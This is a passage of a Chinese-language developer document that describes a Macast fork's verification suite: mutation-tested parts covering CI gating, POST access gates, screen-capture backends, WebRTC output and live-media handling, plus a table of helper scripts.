步骤必须带同一个门（只有 tag push 与 `release=true` 的手工 dispatch 才上传）、清扫 job 必须 `needs: release` 且只在发布成功时按 id 删除本轮 artefacts、`actions: write` 与 `::warning::` 缺一不可、留存仍是 2 天兜底；三条变异体（改开一个门 / 删权限 / 放宽成 `always()`）逐个验过各自必红**；**Part 47 菜单栏的线程纪律（见 §4.2 末条）—— `App.notification` 与 `Macast.update_service_status` 必须把 AppKit 那一跳交给主线程队列：用例从 `CHERRYPY_WORKER_47`/`SERVICE_THREAD` 两个假线程各打一次，要求"就地什么都没发生、排队的东西在 MainThread 落地"，并扫 `macast.py`（七处写入点逐条登记主线程理由）与 `macast/plugins/**`（只许 `build_menu*`/`on_*`）；两个变异体（把 notification 改回就地调用 / 把 relabel 改回就地赋值）各自红 5 条与 7 条；另有四条把"被守的调用点有多少"这个数交给 **AST 现数**（注释掉的 `publish` 不算、跨行的算一处），再拿它去比对**两处散文**（Part 47 的抬头与 §4.2 本条，含 `macast/` + `macast_renderer/` 的拆分）—— §4.13 的"每个数字问两遍"同样适用于我们自己的文档。延后到底能不能落地是**真机**问题，已用真 rumps 循环探过：`app.run()` 之前排的队，循环一起来就执行**；**Part 48 管理 POST 的两道门（见 §4.7b）—— 先证明这道门真的挡不住（PoC 打真应用：无令牌 form-POST `install-plugin` 4/4 拿到可 import 的 `.py`），再修：`_same_site()` 挡跨站表单（Origin 缺失退 `Referer`，比对**名字**不是地址，所以 DNS rebinding 也算跨站），`_CODE_EXECUTION_PARAMS` 那三条会落代码的 POST 另加一道**令牌**门（本机也不算，因为环回挡不住浏览器）。断言分三层：门本身（喂真 `cherrypy.serving.request`，四种来源各判一次）、页面侧文本契约（`management_token` / `require_management_token` 必须在，`before-upload` 必须是 `async` 且 `:data` 带 token）、以及**前提自己也要扫**（全仓扫一遍"没有任何地方发 CORS 头"这句仍然成立；这条用例第一次写错成"字符串出现过就算红"，被自己的扫描误伤，所以现在扫的是**行**并要求那一行真在做 `tools`/`headers` 赋值，另外三条合成行反过来证明扫描器会红）。四个变异体各自变红（删 same-site 调用 5 条 / 把令牌门降级成 `_management_allowed` 7 条 / 页面某条流程漏带令牌 1 条 / 把门改成"什么都不放行" 15 条 —— Part 12/20/21/22/28/48 都从这条路上过，正向契约同样有牙齿），拒绝类用例都配正控（带令牌的两次必须真的过）**；**Part 49 订阅表是发布的、不是就地改的（见 §4.2「copy-on-write」条）—— 先用两个真线程把崩溃复现出来再修**：状态页那条合并表读 8 秒 110 次（被 try/except 吃掉 ⇒ 「客户端信息」整块消失），`add_subscribe` 那条 20 秒 148,302 次且**没人兜** ⇒ 控制点吃 HTTP 500 后永久不再收事件（症状长得像发送端的锅）。修复取 copy-on-write 而不是锁，因为广播那条读**横跨对每个订阅者的网络 I/O**；29 条用例分五层（发布契约 / 五条读路径各自对打一个真在 churn 的写线程且**同时要求读数过阈值** / 修复前的行为 / 两条"全仓库不许再出现就地扩容"的文本规则 / 订阅路径在 stdout 上一言不发），四个变异体各自红 8、1、1、1 条（就地写表 / 把绑定挪到排空队列之前 / 那行 `print` 回来 / 每轮都无条件发布）。**诚实的一条**：`add_subscribe` 自己的 race 在 600 entry 表下**没撞上**（扫描太短），那条路径靠发布契约与文本扫描守着，不靠计时；**Part 50 CI 的盲区与无头导入（见 §4.2 的 pystray 条与 §4.12 末条）—— 它问的是「这套件在 CI 里到底会不会真的拦住什么」**：① `ci_gate()` 的算术用六条合成用例双向测（豁免 Part 34 的红 / 拒绝名单外的任何红 / 没有历史时 Part 34 反而全绿也拒绝 / 哨兵一旦离开 Part 34 名单就不再豁免任何东西），并且它跑在**本进程真实的 RESULTS** 上 —— 第一版用例因为 in/out 名单不互斥，被自己抓住；② `macast/*.py` 顶层不许 import pystray/Xlib（AST 扫，核心文件数 <10 直接红 —— 「扫描器自己坏了」不许读成通过），再用子进程真的 boot 一次 `macast.macast`（pystray 用 meta_path 拦掉、netifaces/pyperclip 打桩、`sys.platform=linux`），并跑**变异体**：把模块顶部的 import 放回去，这一条必须红；③ `--ci` 必须是 workflow 真正调用的那个字符串（用例去读 `.github/workflows/build.yml`）。**这一轮 CI 第一次真的跑这套件**：`build.yml` 新增 `verify` job（ubuntu-22.04、headless、`pip install -r requirements/common.txt`、`python scripts/verify_cast_airplay.py --ci`），`release` 的 `needs` 第一个就是它。**而这个 job 第一次真跑就交付了**：`1667/1679` + 门拒绝，抓住的**不是测试的错，是一条产品 bug** —— runner 上没有配置目录 ⇒ 自签证书生成失败 ⇒ Cast 的 TLS 接收端整个起不来，而日志把锅甩给 `-addext`（见 §4.2「写文件的代码要自己把目录建出来」）。同一趟还顺手暴露了套件自己违反 §10：Part 3 的真 socket 段落一直往用户真实配置目录写证书。选 Linux 不是图便宜，而是 `import pystray` 那个「模块体就开 X display」的坑**只有 Linux runner 看得见**（见 §4.2）。同一趟在 Linux 上量出来的还有三条**测试自己**的错（Part 44 两张配置目录表撞键、Part 49 写线程饿死读线程、Part 26 假二进制把第一次 argv 截断），外加一条门的错：`--ci` 拒绝时原先在 SUMMARY 之前 `sys.exit(1)`，读者恰好看不到那份清单——现在门只决定退出码。它们都不是产品 bug，但都只在非 macOS runner 上现形，这就是那个 job 的价值；**Part 51 一张表决定所有 POST 的门（见 §4.7c）—— 它测的不是"某条端点有没有门"，而是"门这条规则还活在结构里吗"**：表的良构（字段不重复、是 tuple 不是 dict、每一行的门名与方法名都存在、派生的两份名单确实等于按门筛出来的结果），AST 限定在 `class Handler` 内钉住"`POST` 恰好一个、不直接叫任何门（`_same_site` 除外）、必须读 `POST_ROUTES`/`FILE_ROUTES`/`_gate_refusal`、且一个路由字段名都不许多写在 `POST` 里），**按表循环**把 16 行逐行喂一个局域网无令牌请求（403 且那一行的方法 spy 一次都没响）再逐行带令牌（每行真的被服务到），加一条"这个循环 ≥16 行"防它读成空表，加拒绝文案的累积顺序（局域网无令牌听到的是管理那句）、两字段 precedence、未知门 fail closed、fall-through 三种形状（只有 helper 字段 / 拼错的 `clear-logg` / 空 POST）都不许回"success"，上传侧（局域网 `media-file` 403、本机存下并投出、`plugin-file` 的门是 code-execution），以及**页面侧对齐**：从 `setting.html` 抽出它能 POST 的每个字段名，要求在表里都登记得到。四个变异体各自红 3/9/3/1 条（未识别请求改回"success" / 删一条表项 / 把 `mirror-action` 降成管理门 / 未知门名改成放行），其中"删一条表项"那一个抓出的是**测试自己的**休眠分支：`gate_of()` 读模块而非类，只在被扫到那一行才 `AttributeError`；**Part 52 v0.18 的延迟预算重算（见 §4.8 的 caststream 段与两个新旋钮）—— 47 条，按"改了哪四处"分组：① 系统原生 AES（三个后端各自的 ctypes 签名、`if not data: return b''`、**已知答案自检对打 `/usr/bin/openssl enc -aes-128-ctr`**、自检不过就退回纯 Python 而不是发一堆解不开的帧、以及"darwin 绝不去 probe 裸 soname 的 `libcrypto.dylib`"——那条 `ctypes.CDLL` 在 macOS 上会 SIGABRT 掉整个 CPython）；**其中"生产形状"那一组是此前根本不存在的**：早先每条 AES 用例都每次新建一个 cipher，所以从没跑过真正上线的那个形状 —— **一个 handle、每个访问单元 reseed 一次、结束时 release**，而"每帧 reset 悄悄漂移"这种 bug 只住在这个形状里；② 在途窗口按时长算（`clamp(2×RTT, 66 ms, TARGET_DELAY_MS/3)` + 120 帧硬顶，含"未测得 RTT 也吃下限"与"窗口里排队的时间跨度不超过一个窗口"）；③ 编码器三处对齐（`+low_delay` / `-thread_type slice` / **半秒 VBV**，并要它活到真 argv 上）+ VideoToolbox 按 1.5 倍线速要码率（只有它少给三成，x264 那一支不许被抬高）；④ 两个新旋钮（`Mirror_Dlna_Prefill` 越界夹住、`dlna_prefill_bytes(profile)` 保持单参数、`output_hint(kind)` 当场重算而不是读那个已过期的模块级字面量；`Mirror_Live_Edge` 注入 `@LIVE_EDGE@`、**改它不重启镜像**、`PLAYER_PAGE` 仍是 raw 串且没有任何 JS 字符串跨真换行）。**①的两组写成"在没有 OS cipher 的 runner 上也非真空"**：降级路由一个**合成后端**驱动，而不是由这台机器碰巧有什么决定，所以同一条用例在本机与 CI 里是同一个意思。六个定点变异体各自变红 4/4/3/1/3/3 条（bufsize 改回一秒 / `MIN_WINDOW_MS` 66→500 / `_aes_known_answer` 恒真 / `VT_BITRATE_MULT` 1.5→1.0 / 预填设置被忽略 / `PLAYER_PAGE` 去掉 `r`），每一个红的都恰好是编码那条决定的用例，没有连带 —— 这一层是必须的：把三个产品文件整块 stash 只让 Part 52 死在 `module has no attribute '_NATIVE_AES'` 上，那证明的是依赖，不是牙；**v0.10.0 的 tag 构建里那个 Linux `verify` job 又替这一 Part 抓了一回**：三条 argv 用例把「Mac 会发出的命令」当成了运行器事实 —— runner 上 `hardware` 正确地是 x264（一个 `h264_videotoolbox` 都没有），红的就是这三条；修法与 Part 21/22/23/29/38 同款：这一段（连同 `_live52` 循环）把 `sys.platform` 钉成 darwin，两种 runner 上说同一句话 —— 复跑 1816/1822，`--ci` 通过；**Part 53 v0.19 的浏览器重播割点（见 §4.8 的屏幕镜像行）—— 12 条，沿数据流分四段**：① `starts_with_keyframe` 对真 moof+mdat 的 AVCC 逐格判（IDR 开真、P 开假、后到的 IDR 不许回答第一格、SEI/SPS/PPS/AUD 前置跨过、top-level box 走法、错 box 头不许猜、截断/64 位 size/半截 NAL 一律 False —— "读不懂"统一答 False，因为错的 True 是贵的那个方向）；② framer 的三字段契约（头非媒体、整片带 tag、编码器死在片中间那片保持自己的 tag、不足 8 字节的残渣交出去但不算分片）；③ ring 的割点（p,p,idr,p,p→[idr,p,p] 且零日志、无关键帧环回空并计一次 `keyframe_misses` + 恰好一条 warning、空环不是 miss）；④ **全可入的 ring 整环重播**（未分帧形状的老契约；fixture 必须两块 —— 单块在"割到最新"与"整环"两种走法下都是绿的，第一版就是单块所以漏掉了这个回退，是 Part 22 抓出来的）。三个定点变异体各自变红（2026-10-02 逐个跑完整套件量过，都在还原后逐字节复原）：movflags 改回 `frag_keyframe` ⇒ 1 条（Part 22 那条 movflags 用例，别处全绿）；`tail()` 的 tag 判断换成恒真（`if self._ring[index][1]:` → `if True:`）⇒ 4 条（Part 43 的 Matroska 拒答 + Part 53 的 #9/#10，外加 #11 因它记不住那次 miss 而连带）；`starts_with_keyframe` 恒真 ⇒ 10 条（Part 53 的 AVCC 判定 #1–#5、framer tag 的 #6/#8、环割点的 #9/#10 与连带失败的 #11；#7 不动 —— 它预期的 tag 恰好就是 True；#12 与 Part 43 根本不经过这个函数）；**Part 54 v0.20 的 Windows 采集换 ddagrab（见 §4.8 的屏幕镜像行）—— 19 条，按数据流分四段**：① attach 探针三态（真机逐字 `Failed to enumerate DXGI output 2` 喂进 `_DDAGRAB_FAILURE`；`WxH`/`''`/`None` 各自被当作尺寸、无画面、拒绝），输出表在第一次拒绝处停下且进 `_ddagrab_cache`；② 运行时回落 E2E（假 ffmpeg 三个输出 attach 全答应、会话里拒绝：`ddagrab refused the display at runtime` 恰好一条、闩住、gdigrab 起来且**系统声音还在**、`_askedE54 == [0, 1, 2]` 证明重试没有再问一遍 ddagrab）；③ starter/pump 判决让位（pump 对 `ddagrab and not produced` 只记日志；快退判定让"attach 答应了却在会话里死"只花一次重试而**不是整个无帧预算** —— 断言秒数预算而非一瞬间）；④ 选择器与弃声（存的屏幕号选中对应输出、落空回第一个并说出原因、`video_only_capture` 保留 method 与 screens）。8 个定点变异体共红 15 条且各自只在自己那句话上变红（删快退判定 1、pump 提前上报 1、闩失忆 3、失败正则失明 3、探测不清 attach 缓存 1、屏幕号被忽略 2、第一次拒绝后不停 3、弃声丢 method 1），每个跑完整套件后逐字节复原（md5 前后一致 `d85dd270…`）。**Part 55 v0.21 的 macOS 采集换 ScreenCaptureKit（见 §4.8 的屏幕镜像行）—— 40 条，按数据流分四段再加打包面一条**：① 门与探针（macOS 13+ 与绑定两问、解析不干净的版本一律答否、无授权时连 `SCShareableContent` 都不问就静默让位、屏号按 id 选中与落空回主屏都说出原因、过滤器点像素比兜底、闩在 invalidate 后依然有效）；② 管道契约（NV12 平面逐行拼装丢 stride、畸形平面集整份拒绝、没有 token 的命令原样返回、有 token 没 pipe 必须 ValueError 且说明"这次尝试绝不许 spawn"、有 pipe 时 token 只换进新列表而原列表保留 —— 重试还能再解析一次）；③ 失败与让位（第一条失败就是失败、晚到原因被丢弃、stop 之后到的失败被吞、记录失败当场关 ffmpeg 的 stdin、弃声保留 method/spec/屏幕、SCK 弃声的句子压过平台方言且不提麦克风与 BlackHole、设备馈送的 tap 才吃路由警告）；④ E2E 对打（授权机全程走 SCK 且真喂两条流、stream 配置只建一次、双输出 attach、弃声后画面照旧、OS 拒绝一次 = 一条含拒绝文本的 warning + 闩 + 回落 avfoundation、token 绝不进任何命令行）；打包面一条钉 `setup_py2app.py` 的 includes 里那两个包（modulegraph 看不见函数体内 import —— 声明面那两处由 Part 30 自动覆盖，**这里是唯一需要人记得的地方**）。八个定点变异体各自变红 13/2/4/1/12/4/2/1 条（SCK 从没被问 / argv 缺 wallclock / 闩被无视 / 失败时不关 stdin / feeder 没起 / 弃声仍保留音频输入（四个平台各一条同时红）/ SCK 弃声文案缺失 / 删 py2app includes 两条目），每个跑完整套件、还原后 md5 逐字节一致；**Part 56 v0.22 的 WebRTC 输出形状（见 §4.8 的屏幕镜像行）—— 47 条，四段各测"决定这个事实的那一层"**：① A 段问的是这条目标交给 ffmpeg 的 argv（标签说「无声音」，所以即使采集带着声音映射也必须被 `-an` 拒掉；编码参数必须是访问单元切分器与 aiortc 打包路径期待的形状；`gop_size('webrtc')` 必须和观看端队列同一个 0.5 秒）；② B 段把三扇信令门放在**真监听 socket 上打真 HTTP**（页面与两个 POST 只认本会话的 `page_token` —— 管理 `Api_Token` 不算、别的会话的 token 也不算；session 门按构造没有 GET 形状；answer 正文超过上限时在读第一个字节之前就拒；未知 peer 的拒绝在 aiortc 不可导入时照样成立 —— 它的判定排在可选 import 之前；`_webrtc_modules` 的失败**证明不缓存**，因为 hint 承诺"装完再试"；`'VP8' not in sdp` 就是那次静默 VP8 协商 bug 的捕获器）；③ C 段是一个真的 `aiortc` 客户端过真门 —— 全套件唯一一处 offer 被应答、帧真的过 SRTP 的地方，fixture `fixtures/webrtc-h264.bin` 由**生产 argv** 生成（`scripts/fixtures/make-webrtc-h264.py`），pts 断言是确定性的：`k * 90000/FPS`；④ D 段是打包契约 AST（`import aiortc; import av` 必须留在 `_webrtc_modules()` 函数体内 —— 挪到模块顶层就是"没装那行 pip 的每台机器插件整个加载不了"：py2app `packages` 里的 `av`、`includes` 里的 `aiortc`/`cffi`、三个 PyInstaller job 的 `--hidden-import`、两个 requirements 文件，一处不能少）。四个定点变异体各自变红 5/2/2/1 条（过滤器 `str(...)=='1'` 改回 `==1` 但保留拒绝 / 改回 `==1` 并删掉拒绝＝原始静默 bug / 管道封装 h264 改 mpegts / `common.txt` 删 aiortc），全部从 /tmp 备份还原、md5 逐字节一致；**Part 57 v0.24 的一次镜像最大时长（见 §4.8 的屏幕镜像行）—— 47 条，按"这个数住在哪一层"分组**：① 档位表（`MAX_DURATION_HOURS` 三档、默认 12、**没有「不限」**；写入侧按档位拒绝并念出可用数字，读取侧对磁盘上的旧值/越界值夹回默认 —— 两问分开测，因为"页面不是唯一该执行这张表的地方"与"拒绝的后果是一个打不开的设置页"是两个理由）；② 一个真相点（`bound_video_seconds()` 是 `-t` 与 `advertised_file()` 唯一的算术来源，`duration_args()` 是唯一拼 `-t` 的地方，且对无上限的形状**什么都不拼**（`-t 0` 是一条立刻退出的命令）；`-t` 必须落在最后一个 `-i` 之后、muxer 尾巴之前 —— 输出选项不是位置无关的）；③ 范围（只有 `MAX_DURATION_TARGETS = ('cast', 'dlna')` 接这个数，builder 自己按表二次判定而不是信调用方；「画质」卡只为这两路出按钮，不受约束的目标根本不出现这组控件）；④ 只许缩短（60 秒的天花板**故意低于** 1.9 GB 尺寸上限：出厂档位上两个答案是同一个数，而测不出区别的用例不是用例；旁边配一条无天花板的同伴用例，证明量的不是"永远在缩小的 min"）；⑤ 到点（`_duration_expired` 先增 generation 再 `_teardown()`，是计划内的结束不是故障；`_encoder_died` 从**已发布的诊断**里把 `max_seconds` 读回来，认出"`-t` 先到"这一种死法；`_teardown` 是唯一取消计时器的地方）；⑥ 读数（`'max_seconds': _int_flag(command, '-t')` —— 卡片与档位按钮同源于 argv）。**十三个定点变异体各自变红 1/1/2/5/6/1/1/2/1/1/2/1/1 条**（天花板不交给 builder / builder 不再二次判定 / `-t` 挪到 muxer 尾巴之后 / 上限可以拉长那对数字 / `duration_args` 对无上限也写 `-t` / 无论有无上限都武装计时器 / teardown 认领却不取消 / 计划内的结束报成故障 / `-t` 先到不再被认出 / 每个目标都显示档位按钮 / setter 夹住而不是拒绝 / 会话不再记录上限 / 根本不武装 deadline）。**最后两条是第一轮的 0 红**，不是运气：那一轮"会话有没有记住这个数"和"deadline 到底响不响"都没有断言能到达。补法是两条 —— 一条把 `_Session(` 的调用点钉成"同一个值只交出去一次"，一条真的 `_arm_duration_timer(0, 1)` 等一秒，要求一次通知、generation 加过、`_mirroring` 落回 False、STOPPED 排进事件（为此把武装从 `_run_mirror` 里提成一个方法：**用例不许为了看见 deadline 而等一整次真实会话**）。而提取器 `_call_texts57` 自己也曾是错的那一半：它从 0 开始数括号，于是第一个**嵌套**调用（`has_audio=bool(capture.audio_map)`）就提前闭合了区间，读回来的 argv 只剩半句、用例当场红 —— 判据是 1，扫描从这个调用自己的 `(` 之后开始。13 个变异体每个跑完整套件，还原后 md5 逐字节一致（`7a8b1043…`）；**Part 59 网页地址投屏（v0.18 **132 条** → v0.19 **171 条**，见 §4.14）—— 分段按"这个事实住在哪一层"，分段的判据说的是它**碰不碰网络与子进程**：A–H 是解析层的两个解析器与两张表，全部喂 fixture、不碰网络也不 spawn（测的是"我们怎么读一个答复"，不是答复本身）：`scrape_page` 只认页面**写明**的直链 `<video src>` / `<source>` / `og:video` / JSON-LD，且同一份 HTML 里那串签名地址只算一次（**去重按 URL 不按标签**）；真 `yt-dlp -J` fixture 里 `http_headers` 必须跟着地址一起活下来，那是这条功能存在的原因而不是一个附带字段；`ADMISSION_TABLE` 六行按序 first-match，`last_resort` 与 `rejected` 两个计数各问一遍；`STILL_IMAGE_CODECS` 把海报判成"不是视频"；`media_resolve._REFUSED_STATUS` 与 `media_relay.REFUSED_STATUS` 互相钉住；排序把直链排在清单之前并且**说出为什么与 castor 相反**。I 是页面轮的那个 job（计数器、`MAX_MEASURED` 与 `MAX_MEASURED_PER_HOST` 两个度量上限、"解不出"与"解出来但都被剔除"那两句不同的话），并有一条真的在 PATH 上放假 `yt-dlp` 与假 `ffprobe` 跑完整个解析。J–N 是中转：`parse_range` 那张漂移表对打 `cast_local_file` 里的第二份副本、`serve_plan` 作为一个可调用判决、然后**真监听 socket 上打真 HTTP**（反向转发注入请求头 + Range 翻译、剥掉的头名单逐条问而 `Cookie`/`Authorization` **必须留着**、转封装那一路要 `GROW_WAIT_SECONDS` 等到临时文件真的变大），最后是增长、驱逐、TTL 与孤儿清扫。O–P 是 handler 接线：形状校验、job 上限，以及这一整条功能立足的那句话 —— **电视永远拿不到页面里那个地址**。**R 段（v0.19 新增）是后来落到卡片上的那四件**：分享文案（从手机产出的句子里把地址读出来，分享文案的两条判据（整段就是一个地址就原样交出、被全角标点包着的句子按地址边界切开、多地址只报条数、裸 host 仍不许交给引擎））、引擎自己的拒绝原话、cookie（粘贴 → 0600 落盘 → `--cookies` 参数的一整条链 + 浏览器白名单**每次读**复查）、设备下拉（本机永远第一、那一行跟着菜单选的渲染器、投给设备**不碰**我们自己的播放态）；N 段后半是 DASH 合并的第二路输入**带自己的请求头**。**Q 段是页面的文本契约**（`c.<key>` ⊆ `describe()` 的键、「这条没有音轨」的 `v-if` 两个操作数都在、`{{ c.relay }}` 原样转发后端那句话、进度条读 `ResolveJob.STEPS`、`v-else-if="resolve.done"`、卡片与 JS 里不许 `v-html`、轮询在 `code !== 0` 与 `done` 两处都会停）。七个定点变异体各自红 1/1/1/3/1/2/2 条（`advertise_host` 抄回 `get_advertisable_ip` / 空结果不拦 / 死中转不摘 / `plan()` 契约漂 / 卡片编一个模板键 / 卡片用 `v-html` / 无声标签少一个操作数），**v0.19 的九个再红 1/3/1/4/1/1/2/7/2 条**（逐条名单与两个"0 红／连带"的自我修正见 §4.14 末），**v0.18 最后一个还抓到测试自己的 bug**：判红时 `check()` 要把 detail 拼进字符串，而新用例传了 `None` ⇒ Part 59 后半 8 条根本没跑（§4.2 那一族：测试自己的实现也是实现）；**Part 64（2026-10-06，媒体是不是直播，共 234 条）**按"这个事实住在哪一层"分组，从**发送端自己的字段**一路走到**播放器命令行**：A（17）读 `DLNA.ORG_OP` —— 三态判据 `True`/`False`/`None`，而 **`None` 不是 `False`**（`None` 是"保持今天的行为"，`False` 是"这是个能拖的文件"），命名空间前缀、首条带属性的 `res`、只读 local name 三问各自一条；B（14）读 DIDL 本身（`protocol_info_from_didl` 走 local name，`_local_name` 那一次 `rsplit` 是承重的）；C（12）读发送端自称的 Cast `streamType`；D（17）问**接收端对不认识的 appId 要答复**（`SERVED_APP_IDS` 恰好两个，镜像那把钥匙 `0F5096E8` **故意不在**，`launch_refusal()` 的 `message` 必须同时点名那个 app 和「投屏方式」那个旋钮，`GET_APP_AVAILABILITY` 从同一张表派生，非字符串 appId 回落默认媒体接收端）；E（31）是**门到门的那条接缝**（`PlaybackGuard.set_media_url` 的顺序：前任持有者 → `release_playback()` → 写 `owner`（**类属性**）→ `_note_media_live()` → 转发，三种 ERROR 形状各自一句话，且 `screen_mirror._CastSender` 读消息时 `message` 优先）；F（25）/G（28）分别是 DLNA 与 Cast 这两条路上"谁真的把三态写进自己的 `_media_live`"（`None` 由谁写、`False` 由谁写，两条不许互相顶替）；H（30）问 `ProtocolGroup` 的第三个同名陷阱（`_LIVENESS_GETTER = "media_is_live"` 必须按**名字**筛进 `_install_state_methods()`，而它的委托用**与 `_delegate_getter` 相反**的 fall-through 规则：`False` 是真答案必须赢，`None` 才往下走，没意见一路到底仍是 `None` 而不是 `''`）；I（28）是 mpv 那五行（`_loadfile_command` 无选项时交回**裸的四元素** `['loadfile', url, 'replace']`，有选项才是 `[..., 0, options]`，`LIVE_LOAD_OPTIONS` 十项逐字，`start` **只在没被声明为直播时**生效，且下一个裸 load 会把每文件选项归零：`audio-buffer` 0.0→0.2、`cache-pause` False→True、`stream-buffer-size` 4k→131072）；J（13）状态变了才广播（`changed` 先算，只有 `changed and observed` 才进队列，未知键名仍抛 `KeyError`）；K（11）SSDP 的定时重 announce 先问 `is_healthy()`（**故意停掉的服务器不是故障**）；L（8）是接缝命名的全仓审计 —— `note_media_live` 必须**不叫** `set_media_live`，因为 `Renderer.methods()` 按 `set_media_` 前缀枚举、`MacastPluginManager` 把每一个这样的名字订阅到 CherryPy 总线上，所以这一段只有 AST（全仓文本 grep 会撞上那句散文）。**十二个定点变异体各自红 8/12/4/13/24/7/5/7/11/2/2/1 条**，红集除三处点名的连带之外互不相交（A：E 段 7 + F 段 1；B：B 段 6 + F 段 6；E：E13 + F8 + G3；C：C3 + G1；D：D9 + G4；F/G/H/I/J/K/L 六支全部落在自己段内），逐条计数从 `/tmp/mut_*.txt` 的 `[FAIL]` 行现数。**两支第一次没有牙，都是 `check()` 不捕异常那一族**（见本行上方 Part 59 那半句）：D 支第一次只交出 52 条结果就 `AttributeError: 'NoneType' object has no attribute 'get'`，把后 182 条一起吞掉，补法是读消息走 `_field64()`，红法变成 13 条且整段跑完；I 支第一次的红法是**自杀**（`LIVE_LOAD_OPTIONS` 被删空之后用例自己去取 `[4]`，`IndexError` 吃掉后面 175 条），补法是 `_options64()` / `_first_cmd64()` 两个容错读者、**长度问句排在索引之前**，并且那条"必须是新字典"的同时要求 `len == 5` 且逐项等于 `LIVE_LOAD_OPTIONS` —— **容错助手没有守卫就会读成真空话**（这是这一轮学到的形状，比数字更该留下）。**诚实的两句**：Part 64 的 234/234 来自一次性**裁剪 harness**（套件头部 1–228 行 + 这一段 + 一个 SUMMARY 打印器，**没有 CI 门也没有 `sys.exit`**，所以退出码永远是 0，判据只有 `=== SUMMARY: N/M ===` 与 `[FAIL]` 行），合并后的全量总数与 Linux 那一半**本轮都没跑过**（§2 末），所以别把 2415+234 当成一个读数。|
| `cast_conformance.py` | **用真实 pychromecast 栈打真实接收端**（见 §4.9）。`verify_cast_airplay.py` 把网络打桩，所以抓不到"发送端不认账"；`vlc_sender_sim.py` 只复刻 VLC。这个跑的是手机/HA 实际用的那套代码 |
| `e2e_smoke.py` | **唯一跑真应用的检查**（33 条）：用临时配置目录 + 错开的端口（58999，只开 DLNA）在**本机拉起第二个 Macast**，走完发现→设置页→API→SSDP，可选走播放。**代价要明说：那 ~30 秒里局域网内的 DLNA 电视会短暂看到第二个设备**（`Macast E2E Smoke`）。隔离手法是 `appdirs.user_config_dir` 在 `import macast` **之前**打桩（§4.9 那条），种子设置直接写 JSON（绝不 `Setting.set`），所以它不动用户配置、不杀他的实例；跑完自己验一遍"真实配置目录的摘要前后一致"。它导不了 `macast`（自己就是启动者），因此对应用的耦合全是字符串——那些字符串由 Part 33 守着。`--play` 才做真正的播放回环（自己找 ffmpeg、生成 12 秒测试片、起一个支持 Range 的小 HTTP 服务、经带令牌的 GET 入口投出去、要求进度真的在动 + 日志里有 `video-reconfig`）；`--keep` 保留临时目录。**它是端到端冒烟，不是套件的替代**：跑套件仍然不需要它，跑它之前要确认用户不在演示 |
| `selfcheck.py` | 收屏前的环境自检：依赖、端口占用者身份、可广播网卡、组播出口、mpv/`--input-ipc-server`、代理变量。端口占用会区分"Macast 自己在跑"/"macOS 自带 AirPlay"/"别的进程"。被监督的外部程序（`uxplay`、`shairport-sync`）**是 warn 不是 fail** —— 插件是可选的；uxplay 那条直接把编译配方写进 fix，因为没有包可装。**发送端插件那一半（§「sender plugins」段）**：ffprobe 在不在、`-encoders` 里有没有 libx264 / h264_videotoolbox / mpeg2video / ac3（**这四个各自对应一条会静默失效的链路**）、有没有 libass（没有 ⇒ 字幕只能走 WebVTT）、avfoundation 到底列没列出屏幕（**这一条就是 v0.1–v0.7 那个解析 bug 想骗过去的问题**）、系统音频采集口（mac **先问 ScreenCaptureKit** —— macOS 13+ 且绑定在就报"原生采集系统声音，不用 BlackHole 也不用聚合设备"（版本与绑定两个判据与 `screen_mirror._probe_screencapturekit` 一致）；落到 avfoundation 路径才看 HAL 里的 BlackHole 驱动，且"盘上有"与"ffmpeg 列得出来"两问分开报；Linux 问 `pactl` 要 sink monitor）、转码临时目录剩余空间、以及**局域网里到底有没有东西可投**（mDNS browse `_googlecast._tcp` + 一次 SSDP `MediaRenderer` 探测）。它**只读**设置（直接读 JSON 文本，不碰 `Setting`），所以跑它不会改用户配置。Part 32 守着它和插件的一致性 |
| `provenance.py` | **谁写了这个仓库里的每一行**：以 fork 点 `1987923`（其父链 = 上游 215 条提交）为界，用 `git blame --line-porcelain` 把每个 `.py` 数成 `upstream` / `vendored` / `mixed` / `ours` 四态，并检查文件头的声明与这个事实是否一致。两个盲区是显式补的，不是留给读者的：① `macast/plugins/**` 是从 **另一个仓库** `xfangfang/Macast-plugins` 粘进来的，本仓库历史里查不到，所以靠 `VENDORED` 常量表而不是 blame（否则会被算成"我们写的"）；② 改名/挪位置的文件同样丢 blame，所以再比对 **blob SHA**（少于 5 行的文件不参与 —— 全世界空文件的 blob 是同一个）。`--check` 报漂移、`--stamp --apply` **只加声明、代码里没有删除路径**（Part 34 守着这句话）、`--json` 给套件。插入位置受 §4.5 约束（插件清单只从顶部**连续**注释块解析，位置歪了插件会静默装不上）。**改完任何 `.py` 的归属，必须同步 `docs/Provenance.md` 的 `provenance-ledger` 行与两张表**，否则 Part 34 红；它需要完整历史，浅克隆会直接报失败而不是假装通过 |
| `check_index_reachability.py` | 把 selfcheck「online plugin index」那段**离仓**跑一遍：不带 GitHub 凭据问三件事（本仓库是否匿名可见 + 公开上游对照组 + jsDelivr 元数据 API），再逐条问 `plugins/info.json` 的固定链接到底服不服务，输出 `INDEX_PRIVATE` / `INDEX_OK` / `INCONCLUSIVE` 之一 + 逐条状态表 + 退出码（0 全部可装，2 有死链，3 判不出）。`--json` 给 CI 用，`--url-only` 只回答单个 URL。为什么单独一个脚本：这是**发版后必做的那一步**（§8）——本地套件全绿只证明条目 == 所指内容，不证明别人拉得到，而 CDN 缓存会**逐条过期**，没人碰它也会坏（§4.6 那笔"9 条固定链接已有 4 条 404"就是这么量出来的）。**仓库可见性要用它测，不要引文档**：本仓库在这上面错过两次、方向相反（§5）。2026-10-04 实测 **`INDEX_OK`、退出码 0**，也就是"匿名可见"这一问现在是**通过**的；索引是空的，所以逐条那一问只报 `0 of 0`，这一趟的判定全来自前面三问 |
| `vlc_sender_sim.py` | **忠实复刻 VLC 状态机**的发送端（含严格 protobuf 语义）。必须等到 `PLAYING` 才算通过 |
| `cast_probe.py` | 手写 TLS/CASTV2 的最小发送端，打逐步日志 |
| `cast_streaming_probe.py` | **把 `macast/plugins/renderer/screen_mirror.py` 的低延迟通道原样打到真电视上**（镜像接收器 `0F5096E8` + OFFER/ANSWER + UDP RTP）。它 `import` 插件本体而不是复刻协议，所以真机通过 = 设置页「电脑投屏」那条路通过。`--live` 采真桌面、`--source` 用文件、`--dump` 留 Annex-B 给 ffprobe。Part 24 只证明字节自洽，**这一步才证明电视认不认**（§4.9） |
